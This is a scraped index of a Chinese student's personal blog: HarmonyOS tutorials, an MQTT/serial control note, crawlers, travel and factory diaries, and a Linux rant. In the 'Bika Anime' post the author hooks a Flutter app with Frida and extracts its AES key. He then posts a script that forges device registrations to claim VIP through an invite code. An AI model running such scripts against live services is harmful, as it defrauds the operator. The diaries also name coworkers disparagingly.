link.set(value) 修改 link.get() 获取 import promptAction from \u0026#39;@ohos.promptAction\u0026#39; import { User } from \u0026#39;../models\u0026#39; AppStorage.SetOrCreate\u0026lt;User\u0026gt;(\u0026#39;user\u0026#39;, { name: \u0026#39;jack\u0026#39;, age: 18 }) @Entry @Component struct Index { @StorageLink(\u0026#39;user\u0026#39;) user: User = {} build() { Column({ space: 15 }) { Text(\u0026#39;Index：\u0026#39;) Text(this.user.name + this.user.age) .onClick(() =\u0026gt; { this.user.age++ }) Divider() Text(\u0026#39;Get()\u0026#39;) .onClick(() =\u0026gt; { // 仅获取 const user = AppStorage.Get\u0026lt;User\u0026gt;(\u0026#39;user\u0026#39;) promptAction.showToast({ message: JSON.stringify(user) }) }) Text(\u0026#39;Set()\u0026#39;) .onClick(() =\u0026gt; { // 直接设置 AppStorage.Set\u0026lt;User\u0026gt;(\u0026#39;user\u0026#39;, { name: \u0026#39;tom\u0026#39;, age: 100 }) // 观察页面更新没 }) Text(\u0026#39;Link()\u0026#39;) .onClick(() =\u0026gt; { // 获取user的prop const user: SubscribedAbstractProperty\u0026lt;User\u0026gt; = AppStorage.Link(\u0026#39;user\u0026#39;) user.set({ name: user.get().name, // 获取后修改 age: user.get().age + 1 }) }) } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .justifyContent(FlexAlign.Center) } } 状态持久化-PersistentStorage\r#\rPersistentStorage 将选定的 AppStorage 属性保留在设备磁盘上。\nDETAILS UI和业务逻辑不直接访问 PersistentStorage 中的属性，所有属性访问都是对 AppStorage 的访问，AppStorage 中的更改会自动同步到 PersistentStorage。\nWARNING\n支持：number, string, boolean, enum 等简单类型; 如果：要支持对象类型，可以转换成json字符串 持久化变量最好是小于2kb的数据，如果开发者需要存储大量的数据，建议使用数据库api。 简单数据类型的持久化，和获取和修改 import { User } from \u0026#39;../models\u0026#39; PersistentStorage.PersistProp(\u0026#39;count\u0026#39;, 100) @Entry @Component struct Index { @StorageLink(\u0026#39;count\u0026#39;) count: number = 0 build() { Column({ space: 15 }) { Text(this.count.toString()) .onClick(() =\u0026gt; { this.count++ }) } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .justifyContent(FlexAlign.Center) } } 复杂数据类型的持久化，和获取和修改 import { User } from \u0026#39;../models\u0026#39; PersistentStorage.PersistProp(\u0026#39;count\u0026#39;, 100) @Entry @Component struct Index { @StorageLink(\u0026#39;count\u0026#39;) count: number = 0 build() { Column({ space: 15 }) { Text(this.count.toString()) .onClick(() =\u0026gt; { this.count++ }) } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .justifyContent(FlexAlign.Center) } } "},{"id":84,"href":"/docs/code/harmony/%E7%BD%91%E7%BB%9C/","title":"鸿蒙开发-网络请求","section":"鸿蒙","content":"鸿蒙 网络请求\nmodule.json5中添加一下内容\n\u0026#34;requestPermissions\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;ohos.permission.INTERNET\u0026#34;, \u0026#34;reason\u0026#34;: \u0026#34;$string:EntryAbility_desc\u0026#34;, \u0026#34;usedScene\u0026#34;: { \u0026#34;abilities\u0026#34;: [\u0026#34;EntryAbility\u0026#34;], \u0026#34;when\u0026#34;: \u0026#34;always\u0026#34; } } ], import http from \u0026#39;@ohos.net.http\u0026#39; const req = http.createHttp() req.request(\u0026#39;https://zhoushugang.gitee.io/fe2022/takeaway.json\u0026#39;) .then(res =\u0026gt; { console.log(\u0026#39;MEITUAN\u0026#39;, res.result.toString().replace(/\\n/g, \u0026#39;\u0026#39;).substr(0, 250)) // === 3 注意：字符长度大于1024字节，控制台不可见。 const data = JSON.parse(res.result as string) console.log(\u0026#39;MEITUAN\u0026#39;, data.length) }) .catch(err =\u0026gt; { console.error(\u0026#39;MEITUAN\u0026#39;, err.message) }) "},{"id":85,"href":"/posts/%E5%9B%9E%E6%9C%9B/","title":"回望","section":"Blog","content":"\r2024\r#\r谈了女朋友 做项目 赞一点钱 好像看一点书 要说的话，感觉好像跟往年差不多的，但是呢发生了一个很重要的事情，就是谈了对象。在看一样，好像没有进步，做的一些东西感觉不够厉害。\n我觉得自己有点找不到方向了，今年好像有点迷茫啊，没有沉下心了吗？\n我想起来了，现在是大二，我要做很多杂事情，被分心了。等我想起来的时候已经到了年底，并且还有还很多的事情要去做。\n"},{"id":86,"href":"/posts/mqtt--%E4%B8%B2%E5%8F%A3--4055/","title":"MQTT \u0026\u0026 串口 \u0026\u0026 4055","section":"Blog","content":"\rMQTT 服务\r#\r开启服务\r#\r需要在页面中开启service 服务，确保开启。\n发送数据\r#\rMQTT 订阅主题默认是test，发送数据如下\n{\u0026#34;name\u0026#34;: \u0026#34;library\u0026#34;, \u0026#34;mode\u0026#34;: \u0026#34;write\u0026#34;, \u0026#34;serial\u0026#34;: \u0026#34;lamp\u0026#34;, \u0026#34;grip\u0026#34;:\u0026#34;off\u0026#34;} name\r#\r模块名字, 有4各模块分别为:\nlibrary library_ex fan wireless mode\r#\rmode 为控制模式, 有2个控制模式分别为:\nwrite read serial\r#\rserial 为模块的下的组件，如报警器，风扇，二氧化碳，有4个模块分别为\n组件名 说明 访问方式 lamp 报警灯 读写 fan 风扇 读写 co2 二氧化碳 只读 photoelectric 光电烟雾检测器 读写 grip\r#\r仅当mode为write时，grip用来控制开关\noff 关，非0ff开\n接受数据\r#\r提前串口发送数据\r#\r在设置界面中提前设置好预设的串口发送数据，不需要最后的两位crc，MQTT 服务会自动计算CRC校验。\n参考4055和4017的说明文档\n举例 烟雾报警器，有警报灯，光电烟雾检测器，通过4055控制，4055连接RS485 以下为串口发送数据:\n01 0f 00 15 00 01 01 xx xx 01 设备地址 0f 功能码 00 15 起始地址(根据DO 口, 如果是DO 5, 起始地址就是 00 15; DO 6 , 同理即为 00 16) 00 01 线圈数量 01 线圈状态 xx xx crc校验( crc16 modbus) 接受到MQTT发来的信息，会根据模块合组件来向串口发送数据\n"},{"id":87,"href":"/posts/%E5%B0%8F%E8%AE%B0%E7%A6%8F%E5%B7%9E/","title":"小记福州","section":"Blog","content":"\r第一天\r#\r今天应该是周六，这些其实都是后来后来补的，因为周六那天是特别忙的。 昨晚睡的很晚，差不多1点过才睡。早上呢又起得很早，天都塌了。\n首先是开幕式，然后我们我们所有的团队都到图书馆去合照，并且派了指老导师来给我建议，修改提升做作品。所以周六那一天，从上午9点左右一直待了大概10个小时，大部分时间都在看电脑。到了晚上7点，就开始了第一支汇报，自己发挥的还是不错的，就是有点紧张。那个网龙的美术总监说切入点很好，并且用的这个GPT4也很不错。\n值得注意的是福建这边大概5.10 分左右就已经天黑了。等到所有的队伍汇报完毕，等待出结果，然后为明天的汇报顺序抽签。\n回到酒店差不多是在10点左右，其实已经很累了，但是还要修改ppt和演讲稿，真的很累。蒋老师一直指导到大概1点钟，然后我自己又弄弄弄，直到1.30才睡觉。那个酒店应该是学校背后的那个网龙公司的资产，看这像是一个四星级酒店，但是那个床我睡着是真的觉得不舒服，那个被子一点都不暖和。\n周六差不多就是这样的吧，不过我感觉自己出来两天，有点寂寞。\n第二天\r#\r周天，对得，今天是周末。\n早上依旧起的很早，然后摸摸去吃早饭，酒店离学校里面的食堂还是一点距离的，先出酒店，还得过马路，进学校还有一段路。奶奶的，一天天的真的累的要死。\n吃了早饭，8.30就开始了正式汇报，看了前面几个，感觉跟昨天的那个还是有了很的变化，正式了许多。\n一个18个队伍，我在第14个，算是比较靠后的，没什么优势了。\n基本没什么问题，评委说是市场上竞品，可以去横向对比一下，功能有些繁杂了。\n不过也没啥毛病，11.40左右，开始闭幕式，颁奖。\n拿了一个铜奖，其实也差不多，但是心理多少有点可惜的，但又自己的努力很大程度上也是会影响是自己发挥的，这个作品本身就是临时想出来的，做出来，甚至很多东西都还没些写完。所以那就这样吧，以后有机会可以再修改、完善一下。\n拍照，真的拍了很多的照片。在周六那一天的时候，我们几个队伍都汇报完了，后来在合影吧，就在座位上面，大家做在一排，拍了一个广角，难免把后面的队伍也拍到了。后面的队伍还比了一个手势，然后他们找我要微信，我还以为。原来是找我们的队长，其实我们4个人，3个都是队长，我也是。找的是另一个人，韩明杰。也算是一个小插曲。\n当天下午走的很急，2.30就要上车去市区，坐的学校的小车校车，那叫一个不舒服，老不舒服了。\n到了市区，也就是福州站，然后又是走路，走到地铁口，坐地铁嘛，做了几站。那个挤啊，感觉都能堪比成都地铁2号线了。下站，又是走路，一公里的路，说走就走的啊。可给我累了了。\n到了民宿发现，居然是一个日系的，榻榻米和日本服饰。\n躺，差不多到了晚上5点钟的时候，天已经黑了。去那个什么三坊七巷。还是一个5a景点呢。\n也还不错，人也挺多的。拍了好多的照片，吃了福州的特色菜。回去的时候下了一点小雨。\n然后跟大宝贝梅梅打电话。睡觉。\n第三天\r#\r记录一下。\n回家，行程是这样的，\n早上9点起床，然后，收拾行李。打车去机场，坐了1个小时 吧\n取机票，等飞机。坐飞机。大概坐了一个小时左右，到湖南长沙黄花，休息10分钟左右。\n继续起飞，又坐了大概2个小时，终于到了绵阳。\n下飞机又是天府行，坐车大概1个半小时，恼火得很。\n就这样吧。类似了\n"},{"id":88,"href":"/posts/%E5%88%86%E4%BA%AB%E4%BB%A5%E5%8F%8A%E6%9D%82%E8%B0%88/","title":"分享以及杂谈","section":"Blog","content":"最近做项目, 需要很多数据，写了些爬虫, 没什么，拿出来分享\n一个大学排名的 import requests,json page=1 url=\u0026#39;https://www.topuniversities.com/rankings/endpoint?nid=3897789\u0026amp;page={0}\u0026amp;items_per_page=20\u0026amp;tab=\u0026amp;region=Asia\u0026amp;countries=\u0026amp;cities=\u0026amp;search=\u0026amp;star=\u0026amp;sort_by=rank\u0026amp;order_by=asc\u0026amp;program_type=\u0026#39; data=[] result=requests.get(url.format(page)).json() surplus=result[\u0026#39;total_record\u0026#39;]-20 data+=result[\u0026#39;score_nodes\u0026#39;] while surplus\u0026gt;0: page+=1 result=requests.get(url.format(page)).json() data+=result[\u0026#39;score_nodes\u0026#39;] surplus-=int(result[\u0026#39;items_per_page\u0026#39;]) with open(\u0026#39;data/3.json\u0026#39;,\u0026#39;w\u0026#39;,encoding=\u0026#39;utf-8\u0026#39;) as f: json.dump(data,f) 校徽图片的 from concurrent.futures import ThreadPoolExecutor from lxml import etree import requests def download(i): image_url=f\u0026#39;https://www.urongda.com/img/{i}-logo.png\u0026#39; with open(f\u0026#39;image/{i}.png\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(requests.get(image_url).content) result=requests.get(\u0026#39;https://www.urongda.com/\u0026#39;) html = etree.HTML(result.text) href=html.xpath(\u0026#39;/html/body/main/div[1]/div//@data-name\u0026#39;) with ThreadPoolExecutor(max_workers=10) as t: for i in href: t.submit(download,i) 虎扑评分的爬虫，一点点加密 import hashlib,time, requests, json from concurrent.futures import ThreadPoolExecutor header={ \u0026#39;user-agent\u0026#39;: \u0026#39;Dalvik/2.1.0 (Linux; U; Android 9; ASUS_I005DA Build/PI) kanqiu/8.0.77.04267/9403\u0026#39;, \u0026#39;cookie\u0026#39;: \u0026#39;cpck=eyJpZGZhIjoiIiwiY2xpZW50IjoiMzAzMzE0N2Q4YjdlN2M4NiIsInByb2plY3RJZCI6MX0%3D\u0026#39;, \u0026#39;x-hupu-token\u0026#39;: \u0026#39;\u0026#39; } mdata=[] def main(page): t= str(int(time.time()*1000)) data_list=[[\u0026#39;channel\u0026#39;, \u0026#39;miui\u0026#39;], [\u0026#39;clientId\u0026#39;, 156524155], [\u0026#39;crt\u0026#39;, t], [\u0026#39;deviceId\u0026#39;, \u0026#39;BDqaLzSrCAXBtDgH3bbkMVITrkolufoUCXPmuc4+Uzmui0h/fDc6Aw3SbPKhc3OyEjVAlGxR8gyt8clM4NXpffg==\u0026#39;], [\u0026#39;night\u0026#39;, 0], [\u0026#39;nodeId\u0026#39;, 1421265], [\u0026#39;page\u0026#39;, page], [\u0026#39;pageSize\u0026#39;, 10], [\u0026#39;queryType\u0026#39;, \u0026#39;hot\u0026#39;], [\u0026#39;teenagers\u0026#39;, 0], [\u0026#39;time_zone\u0026#39;, \u0026#39;Asia/Shanghai\u0026#39;]] s=[f\u0026#39;{i[0]}={i[1]}\u0026#39; for i in data_list] data=\u0026#39;\u0026amp;\u0026#39;.join(s)+\u0026#39;HUPU_SALT_AKJfoiwer394Jeiow4u309\u0026#39; sign=hashlib.md5(data.encode()).hexdigest() body={ \u0026#39;pageSize\u0026#39;: 10, \u0026#39;page\u0026#39;: page, \u0026#39;nodeId\u0026#39;: 1421265, \u0026#39;queryType\u0026#39;: \u0026#39;hot\u0026#39;, \u0026#39;clientId\u0026#39;: 156524155, \u0026#39;crt\u0026#39;:t, \u0026#39;night\u0026#39;: 0, \u0026#39;channel\u0026#39;: \u0026#39;miui\u0026#39;, \u0026#39;teenagers\u0026#39;: 0, \u0026#39;time_zone\u0026#39;: \u0026#39;Asia/Shanghai\u0026#39;, \u0026#39;deviceId\u0026#39;: \u0026#39;BDqaLzSrCAXBtDgH3bbkMVITrkolufoUCXPmuc4+Uzmui0h/fDc6Aw3SbPKhc3OyEjVAlGxR8gyt8clM4NXpffg==\u0026#39;, \u0026#39;sign\u0026#39;:sign } result=requests.get(\u0026#39;https://games.mobileapi.hupu.com/1/8.0.77/bplcommentapi/bpl/score_tree/groupAndSubNodes\u0026#39;,params=body,headers=header) for i in result.json()[\u0026#39;data\u0026#39;][\u0026#39;nodePageResult\u0026#39;][\u0026#39;data\u0026#39;]: print(i[\u0026#39;node\u0026#39;][\u0026#39;name\u0026#39;],i[\u0026#39;node\u0026#39;][\u0026#39;image\u0026#39;][0],i[\u0026#39;node\u0026#39;][\u0026#39;scoreAvg\u0026#39;],i[\u0026#39;node\u0026#39;][\u0026#39;hottestComments\u0026#39;]) mdata.append({\u0026#39;name\u0026#39;:i[\u0026#39;node\u0026#39;][\u0026#39;name\u0026#39;],\u0026#39;image\u0026#39;:i[\u0026#39;node\u0026#39;][\u0026#39;image\u0026#39;][0],\u0026#39;scoreAvg\u0026#39;:i[\u0026#39;node\u0026#39;][\u0026#39;scoreAvg\u0026#39;],\u0026#39;hottestComments\u0026#39;:i[\u0026#39;node\u0026#39;][\u0026#39;hottestComments\u0026#39;]}) with ThreadPoolExecutor(max_workers=10) as t: for x in range(1,51): t.submit(main,x) with open(\u0026#39;hp1.json\u0026#39;,\u0026#39;w\u0026#39;) as f: json.dump(mdata,f) 然后就是谈谈最近, 我发现我自己已经树立了一种沉默寡言高冷的大佬学霸的一种形象, 欸，无所谓吧 就让他们自己去烦恼吧。我为什么要平等的去帮他们，明智的做法, enn. 维护这些人际关系真的超级累好吧，人机。 有些人也是真机把烦，已经和全班第一烦平起平坐了。\n就是这些发完牢骚了\n"},{"id":89,"href":"/posts/linux/","title":"Linux","section":"Blog","content":"在寒假最后几天给自己的电脑装了一个Arch linux ，直至开学，重装了大概3，4次才得到现在的完整版，好像来到学校还装了一次。\n优点\r#\r非常的好玩，很有意思，很多软件使用都挺方便的，pacman 直接一装，使用起来也很流畅，跟windows比还是要流畅一些的\n界面的美化以及自定义程度很高，使用起来非常有味道。\n缺点\r#\r其实也没什么太大的缺点，我本来以前也学过一些网络安全，对linux还是有一些了解的。使用起来没有什么太大的问题。 但是呢，迫于环境原因，课程也很弱智，安排一些pr，ps这种沙雕课程，明明应该放到自学里面的，还要教，虽然我也不是很会，这种东西本就不感兴趣，更还是linux，彻底裂开了，虽然有替代品，但是我也不是天才啊，我也不想主动去学。 只能用虚拟机来搞。ps，pr就算了，本就想到了，但是，c#窗口程序还写不了，我日他大坝。开始还写不了微信小程序(大专是不是都喜欢教这个)，后来又装上了，aur找的，也算还行。腾讯美马，近来要让写鸿蒙，我一看，tm的鸿蒙也不提供linux的studio，我真是曹思他大坝的，写你马。\n总结来就是很多厂商不给适配linux ，即便可以做到，也不去做。\n好了，这篇文章就是用来吐槽的\n4.28\r#\rlinux 寿终正寝了， 被老师叫换回去，我测了啊\n放心，他还会回来的，暑假再去买一台轻薄本装linux，就这样吧，备份去了\n"},{"id":90,"href":"/posts/bika-anime/","title":"Bika Anime","section":"Blog","content":"bika 动漫,dddd\nflutter 以前用过，但是没有arm64的so，所以就放弃了，今天一个朋发给我，发现居然后arm64的，那就别怪我不客气。\nblutter 启动，dart 2.19 解析出来了\n主要是看pp.txt和 addNames.py 这两个文件，找关键字，看有地址的，一般这种软件加密都是aes，所以直接搜索，然后挨个挨个frida hook，\nblutter 会生成一个blutter_frida.js, 添加一句话\nconst fn_addr = 0x7e1018; Interceptor.attach(libapp.add(fn_addr), { onEnter: function () { init(this.context); let objPtr = getArg(this.context, 0); const [tptr, cls, values] = getTaggedObjectValue(objPtr); console.log(`${cls.name}@${tptr.toString().slice(2)} =`, JSON.stringify(values, null, 2)); //就是添这句话,找关键字就行了, console.log(\u0026#39;hexdump ==\u0026gt; \u0026#39;+hexdump(objPtr)); } }); 多hook 几次基本拿下，然后就是猜，deviceId忙猜随机生成，拿uuid做md5取前16位，直接传上去，发现可以，最后就是喜闻乐见得绑定邀请码获得VIP，直接就是稳稳得拿下。\nimport requests, time, json, uuid ,hashlib from Crypto.Cipher import AES from Crypto.Util.Padding import pad code=\u0026#39;YMMTK\u0026#39; cipher = AES.new(b\u0026#39;525202f9149e061d\u0026#39;, AES.MODE_ECB) def get_header(): return { \u0026#39;user-agent\u0026#39;: \u0026#39;Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleDart/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17\u0026#39;, \u0026#39;version\u0026#39;: \u0026#39;1.0\u0026#39;, \u0026#39;devicetype\u0026#39;: \u0026#39;android\u0026#39;, \u0026#39;time\u0026#39;: str(int(time.time()*1000)), \u0026#39;host\u0026#39;: \u0026#39;api.bkrezwvjkc.com\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, } def remove_pkcs7_padding(data: bytes, block_size: int = 16): if len(data) % block_size != 0: raise ValueError(\u0026#34;Data length is not a multiple of the block size\u0026#34;) padding_length = data[-1] if padding_length \u0026gt; block_size or padding_length \u0026lt;= 0: raise ValueError(\u0026#34;Invalid padding detected\u0026#34;) padding = data[-padding_length:] if any(byte != padding_length for byte in padding): raise ValueError(\u0026#34;Inconsistent padding detected\u0026#34;) return data[:-padding_length] def en(map): plaintext_bytes_padded = pad(json.dumps(map).encode(), AES.block_size) return cipher.encrypt(plaintext_bytes_padded).hex() def de(s): a=cipher.decrypt(s) a=remove_pkcs7_padding(a) return json.loads(a.decode().replace(\u0026#39;\\r\u0026#39;,\u0026#39;\u0026#39;).replace(\u0026#39;\\\\\\\\\u0026#39;,\u0026#39;\\\\\u0026#39;)) def device_id(): random_uuid = uuid.uuid4() uuid_str = str(random_uuid) return hashlib.md5(uuid_str.encode()).hexdigest()[:16] def get_token(): dviceId=device_id() map={\u0026#34;token\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;deviceId\u0026#34;:dviceId,\u0026#34;data\u0026#34;:{\u0026#34;app_code\u0026#34;:\u0026#34;ch2\u0026#34;,\u0026#34;clipboard_text\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;channel_code\u0026#34;:\u0026#34;channel://zwkab1bk\u0026#34;}} result=requests.post(\u0026#39;http://api.bkrezwvjkc.com/cxapi/system/info\u0026#39;,headers=get_header(),data=en(map)) json_str=de(result.content) print(json_str) return json_str[\u0026#39;data\u0026#39;][\u0026#39;token\u0026#39;][\u0026#39;token\u0026#39;], json_str[\u0026#39;data\u0026#39;][\u0026#39;token\u0026#39;][\u0026#39;user_id\u0026#39;], dviceId def bind(): token, uid, device_id=get_token() map={\u0026#39;token\u0026#39;:token+\u0026#39;_\u0026#39;+uid,\u0026#39;deviceId\u0026#39;:device_id,\u0026#39;data\u0026#39;:{\u0026#39;code\u0026#39;:code}} response = requests.post(\u0026#39;http://api.bkrezwvjkc.com/cxapi/user/bindParent\u0026#39;, headers=get_header(), data=en(map)) json_str=de(response.content) print(json_str) bind() "},{"id":91,"href":"/posts/diary/","title":"diary","section":"Blog","content":"\r首记\r#\r岛村评价驹子写日记认为这是一种徒劳的行为，当时我也这样认为。\n现在心态一日不如一日，要抑郁了，想写日记记录自己琐碎的生活和自己的18岁\nMaybe I can\u0026rsquo;t be alone anymore\n丰满阅历\r#\r我需要一些东西来丰满自己的阅历，或者说是填充自己更加自由，理想的生活\n读10本书（电子 or 纸质）\n围城 人间失格 高数（这不算吗，得算上 追风筝的人 看5场电影（电影院 or phone）\n天空之城（影院 蜘蛛侠：纵横宇宙（影院，超级赞 情书（phone，太美了 长安三万里 \u0026lt;点映\u0026gt; 写日记\n去旅行，去玩，去远一些的地方\n女朋友\n6-13\r#\r今天开始写日记，学了导数，知道晚上才搞清楚复合求导，加班2，疲倦，回来吃个玉米雪糕^_^，泡面\n6-14\r#\r没加班，高兴捏，今天挺凉快的，回来就写代码\u0026lt;网易云同步歌单下载\u0026gt;，晚上看电影《情书》\n6-15\r#\r忘写，次日，补：\n下早班捏，虽然才周四。却想看去电影了，本来订的周五的票，不小心订错了[35]，索性就去看了。\n8点钟的《蜘蛛侠：纵横宇宙》，真的超级好看，甚至想二刷，超级好看，说真的。\n出门前天色灰的很，索性买了把伞[25]，回来骑车时中途换了一个车，结果自己就给忘记拿了，本来路上都想起来的，但是，换车那里人挺多的，在况且车也少，所以我笃定伞已经被人拿了，可能也没有被拿（薛定谔的伞）。\n总结一个定理：出门不带伞，带伞需带包，否则必定忘拿。上次的伞也是放在自行车车篮里忘拿了，走出十几步路回来已经没有了。\n晚上将近12点才睡\n6-16\r#\r下早班，上班便是想着下班，加上双休，更爽了。回来，调试代码（adb 路径尽量不能带中文，很奇怪，但也不想去究其原理）。\n有个人，黄忠宇，记一下，以后或许会想起他，请我吃了一根热狗。\n既然开始记人了，那也得写一下温东英，淫棍一个，10年打胶工（含嫖），蛮搞笑的\n6-17\r#\r补：\n周末，躺，晚睡，泰勒展开，王者\n6-18\r#\r妈的，早上被电钻吵醒了，待会儿区物业投诉（10点\n修手机花朕200大洋，赶紧root了，回来顺路去投诉，宿舍有个人是真的烦，试图投诉赶走(失败\n6-19\r#\r周一转夜班，只能提前写或者次日来写，为了提前倒过来，3点睡13点醒。\n2点那会去买乐虎，想去荡秋千，居然有人了，站了一首歌的时间，蚊子多，回\n6-20\r#\r次日记，回来，累，脚痛，停水，睡觉\n6-21\r#\r当日记，停水至下午，洗澡。\n如果你想做一些荒诞的事，马上停下，洗个脸，然后再忘掉\n6-22\r#\r荒唐，4点睡，15点被吵醒，荒唐，19，吃饭\n算了，情有可原，和陈柯航打游戏\n端午节，无粽。\n——\n2天后补，即24号，记在端午节那天比较好\n18个端午节，我没有任何一个端午是粽子吃到吐的，此后，每到端午，我常想吃很多粽子，今年仍未如愿，小时未尝，来时却无味。我常想去吃汉堡，吃完却仍不得意。\n同买桂花欲载酒，终不似，少年游\n6-23\r#\r次日记，持续早班，富士康实在没法待，下个月的这一天就可以离开了。\n停止内耗，心里想了许多，我还是想做我自己，既然已经上车了，就坐到站吧。（自己的主要心理活动还是源自那部动漫《跃动青春》中的一个女角色）\n或许，今天是个特别的日子吧。\n我想区拓展自己的兴趣爱好，现在就想了两个（手绘和篮球），代码暂时不想写了，好好学习吧，在看数学，（今天的曲率是一点没看进去呢），说不定还会学英语呢，给自己挖个坑吧。\n路上我发现，我走的比大部分人快，可这并没有什么用，很难承认努力就会有回报。\n贴一张图，下早班，路上拍的，这天蓝的很，像是填充的颜色一样，均匀的很，又有些微微的夜色。\n就这样吧，不想再写了今天的内容了，睡去。\n塞张图盘，下班路上拍的，太蓝（难）了。\n6-24\r#\r次日记，早班，无他，吃的挺好，2r冰淇淋，10r零食，13r午饭，3r粽子，总花费28，较往日还是比较奢侈的了。\n6-25\r#\r次日记，整个晚上好像都在写代码，大概写到5点吧，吃早饭，对了，新买的耳机到了，79用着还行，，又是周一，妈的，上他娘的个鸟办，烦人\n6-26\r#\r次日记，早班，无他，在看不定积分了。下班买了桃子，4个居然要收我9元，离谱。买的2个包子，吃到一半，掉地上了，妈的。\n6-27\r#\r29日补，加班，额，倨想不起来那天的事情，随便写一点（勿要被别人兜家底，或者一言全部道出），积分换元看不懂了\n6-28\r#\r次日补，早班，被调到313去了，即前C06，还挺不错的，睡觉没有人打搅，但是下次记得带一件外套，蚊子多。\n积分换元又能看懂了，但是第二换元根本不想看啊（后面那面鸡儿难），不想看数学了，想去借一本书了看，（山月记）\n回来打了游戏再写的。无心勒垒代码了\n6-29\r#\r次日补，加班1h，无他。数学把不定积分过了一遍。\n6-30\r#\r次日补，早班，双休，耶耶。回来打几把王者，愤下\n究竟是我眼短，还是他真的俗（保安一天两百有什么可炫耀的（唐嘉豪。\n看了几个短视频就以为自己很懂网络关键词了，鼠目寸光，愚不可及（还让我内卷，卷你妈呢（还张雪峰，你也就知道这个人了是吧，这不让学那不让学，你行你上呗，你以为计算机很好挣钱的啊，妈的。\n我把高数拿回来了，看不懂了（或许我需要一支笔）\n7-1\r#\r妈的，忘记写了，4号补。\n好像是早班，回来打游戏？（忘了）。又看无职转生，忘了，不写\n7-2\r#\r4号补，那天睡得比较乱，1点钟出门去看电影《长安三万里》点映，165分钟（可惜我并不能与剧中的诗人入境，无法体会到诗人的心情，电影也不算差）。电影院的椅子真垃圾，屁股痛。\n回来又看无职转生，一直看完了25集。居然有些难受（虽然第二季马上就出来了，艾莉斯的家人\u0026lt;呜呜\u0026gt;）。\n我已经告别了过去，希望不要重蹈覆辙。\n7-3\r#\r次日补，即4号。\n无他，为了上厕所，开了（陈良友的柜子拿纸\u0026lt;今天没来\u0026gt;，我居然还记得他的工号，我的内心并没有谴责自己）加班2。数学是不想看了，明天带另一本书去。\n我好自私啊，希望以后以后以后不要再自私了吧\n7-4\r#\r次日补，加班2，无他，把《追风筝的人》带去看了，无他。\n无知的人你都不想和他说话，不想怼他。\n7-5\r#\r次日补，加班2。\n上班居然忘带工卡了，特地请假一个小时回来，结果今天留了9个板，还好我那个点我请假了（难道是老天在看\u0026lt;我始终相信吉人自有天相\u0026gt;）。\n把书给看完了，就昨天写的那本，本来7-3带去的，两天还挺快的,还是挺好看的。\n今晚把另一本带去《山月记》\n7-6\r#\r次日补，加班2。\n我在看《山月记》了，还不错诶。\n回来看了看flutter的逆向，现在似乎有两条路可走（一条）。\ndrat文件信息来hook（弃） 修改so文件重打包，动态调试（未做尝试 由于昨天就在看flutter的逆向，直至12点半睡去，导致睡过头，迟到半个小时。不允许再搞这么就了。所以，睡去。\n7-7\r#\r次日补，加班2。无他。\n妈的天天加班，周六也要上班，该乐还是改悲呢。\n终于要发通知书了，昨天来电话了，还想让我办校园卡，妈的。\n我把手机买了，开白条买的，2500，我好自私，但请原谅我，对不起。\n7-8\r#\r次日补，今天周日，周六加班。无他。\n回来打了游戏，还行。《山月记》en,eee\n7-9\r#\r今天休息，晚上写了个flutter md5 demo 完全无法逆向，妈的。\n7-10\r#\r次日补，加班，不让带小说去看了，妈的，我的《山月记》还没看完\n应是周一的时候，热得很，无法入睡，燥热难安。\n7-11\r#\r次日补，加班1。\n6点出来骑个共享单车，试了下后轮，感觉漂移很容易，刷了几下。过弯的时候，有那个有轨电车的铁轨，给我摔一跤，还好没摔着。\n切记，雨天莫涮漂移，小心铁轨。\n又被调去原来的自动化分板区用自动化分板了，但还是在原来的小组。无他。\n7-12\r#\r次日补，没加班，但是很累，与原来所在的小组合并了，但却更累了……\n本来24可以走了的，但是买了手机，得多搞点钱，想干到下个月发工资的或者十多二十几号再走，现在似乎得走一步看一步了。\n我去看了eva，真是好看啊，所有程度上。\n7-13\r#\r次日补，早班，现在似乎加班不是很多了，考虑到期跑路。\n无他。跑路之前，把软件写完，idsbg那个，加个历史记录功能，买个服务器，把查询记录上传到服务器，写点加密，用flutter写，再宣传一手这个软件，免去了暴力拼遍历工号的大量需求，但也有不足。这招叫什么呢，草船借箭，帅。这周应该是双休，看能不能这周完成。但是怎么宣传出来呢，有点麻烦，害怕被溯源。\n无他。\n7-14\r#\r次日补，我真的会谢，周六要上班10个小时，妈的，得要改变一下计划进度了，麻烦事真的着急多，服务器，代码，妈的。\n今天倒是挺累的，跑路的计划不变。打游戏一直正负的搞，烦人。无他\n7-15\r#\r次日补，明天上白班了，考虑跑路。无他。\n遇到一个人，阑其伟，这个姓还挺少见的。\n7-16\r#\r当晚，洗头前写的。今天好困啊，写了大半天代码，dart还挺简单的，主要是写得少，很多操作都不会，工作完成大半了了（sql，和服务器这边就ok了）22：30买了个vpn，81块\n7-17\r#\r今天上白班，白班夜班各有各的好处吧，白班人多规矩多，但是作息好，饭菜也好。\n算了，先转正吧，到下月7号在跑路。无他，继续谢\n7-18\r#\r无他。白班好困啊，易打瞌睡，又累。\n搞的vps换了几个系统都不好用，还是得Ubuntu啊，妈的，睡了。\n7-19\r#\r居然忘记写了，次日补。早班，回来调试了会儿代码，10点睡了。无他，上班的事情真是无聊至极，愚蠢至极，所有的人。\n7-20\r#\r早班，无他，回来打算继续调试代码的，希望西南交通大学又来打电话找我了，第二次了，前段时间有个成都信息工程来找我，什么垃圾学校。洗个澡，码。\n再也不想来电子厂了，戾气又重，社会气息太重了，蠢人又多。无他。\n7-21\r#\r忘写了，又是次日来补，周五，早班，双休，嗷嗷爽，回来打了游戏，点外卖吃的汉堡。1.30点睡，泻火，妈的。\n7-22\r#\r今天修缮代码，就那个草船借箭（上面有说）那个项目，真来昨天写得差不多了，今天继续完善，sql真的不会啊，用hive，差不多了，服务器也写了，准备投毒了（好像还要修一修）。\n先把下个项目的文件构思准备一下（就是在android端更新net的音乐，突然想起可以写so文件来实现内嵌歌词啥的，先吧so文件写好，java上测试一